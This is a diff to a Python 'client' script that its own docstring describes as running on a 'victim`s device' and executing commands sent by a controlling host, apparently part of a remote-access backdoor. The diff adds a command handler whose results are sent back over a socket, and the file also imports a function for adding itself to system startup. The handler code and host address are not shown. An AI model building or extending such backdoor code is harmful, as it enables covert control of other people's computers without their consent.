@@ -5,8 +5,8 @@ client - script located at victim`s device and executes host`s commands
 """
 
 from threading import Thread
-from time import sleep
 from utils.utils import add_to_startup
+from utils.client_handler import command_handler
 from sys import argv
 import socket
 from os.path import join
@@ -33,7 +33,12 @@ def receive_data(conn):
             data = conn.recv(1024)
             content = data.decode('utf-8')
 
-            print(content)
+            answer = command_handler(content)
+
+            print(content, answer)
+
+            if answer:
+                conn.send(str(answer).encode('utf-8'))
         except:
             continue
 
@@ -44,14 +49,5 @@ receiver = Thread(target=receive_data, args=[
 
 receiver.start()
 
-while 'SENDING':
-
-    message = 'HI EVERYBODY'
-
-    try:
-        sock.send(message.encode('utf-8'))
-    except:
-        pass
-
-    sleep(1)
-    print('I SENT MESSAGE')
+while 1:
+    pass
